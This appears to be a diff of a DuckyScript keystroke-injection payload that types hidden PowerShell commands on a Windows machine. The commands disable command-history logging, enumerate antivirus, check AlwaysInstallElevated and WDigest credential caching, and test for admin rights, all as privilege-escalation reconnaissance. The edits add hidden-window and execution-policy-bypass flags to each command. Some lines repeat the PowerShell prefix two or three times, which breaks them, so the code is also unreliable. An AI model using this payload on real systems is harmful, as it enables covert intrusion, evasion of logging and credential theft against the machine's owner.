@@ -14,33 +14,33 @@ DELAY 1000
 GUI r
 
 REM Disable powershell logging
-STRING powershell -c "Set-PSReadlineOption –HistorySaveStyle SaveNothing"
+STRING powershell -w h -NoP -Ep Bypass -command "Set-PSReadlineOption –HistorySaveStyle SaveNothing"
 ENTER
 DELAY 200
 REM 	List installed AV
-STRING powershell -c "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"
+STRING powershell -w h -NoP -Ep Bypass -command "& Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct"
 ENTER
 DELAY 200
 REM 	Check for installable file permissions
-STRING powershell -c "gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"
+STRING powershell -w h -NoP -Ep Bypass -command "gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"
 ENTER
 DELAY 100
-STRING powershell -c "gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"
+STRING powershell -w h -NoP -Ep Bypass -commandpowershell -w h -NoP -Ep Bypass -commandpowershell -w h -NoP -Ep Bypass -command "gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated"
 ENTER
 DELAY 200
 REM 	Get SID of current user
-STRING powershell -c "([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value"
+STRING powershell -w h -NoP -Ep Bypass -commandpowershell -w h -NoP -Ep Bypass -command "([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value"
 ENTER
 DELAY 200	
 REM     Check for elevated privileges
-STRING powershell -c "If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { echo "yes"; } else { echo "no"; }"
+STRING powershell -w h -NoP -Ep Bypass -command "If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { echo "yes"; } else { echo "no"; }"
 ENTER
 DELAY 200
 REM 	Find unquoted service paths [TO-DO]
-REM STRING powershell -c "gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode" | "Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}"" | "select PathName,DisplayName,Name"
+REM STRING powershell -w h -NoP -Ep Bypass -command "gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode" | "Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}"" | "select PathName,DisplayName,Name"
 
 REM 	Check for LSASS WDigest caching
-STRING powershell -c "(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"
+STRING powershell -w h -NoP -Ep Bypass -command "(gp registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential"
 ENTER
 DELAY 200
 
